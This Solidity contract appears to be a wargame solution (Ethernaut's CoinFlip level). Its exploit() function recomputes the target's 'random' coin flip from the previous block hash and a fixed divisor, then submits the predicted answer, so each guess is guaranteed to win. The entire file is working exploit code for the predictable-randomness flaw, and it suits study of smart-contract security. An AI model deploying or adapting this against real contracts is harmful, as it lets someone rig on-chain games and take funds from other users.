// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel03.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract Flipit {
    using SafeMath for uint256;

    CoinFlip level3 = CoinFlip(0xa7604317Ebe188501578474781f18e8750d6FD3E);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            level3.flip(true);
        } else {
            level3.flip(false);
        }
    }
}
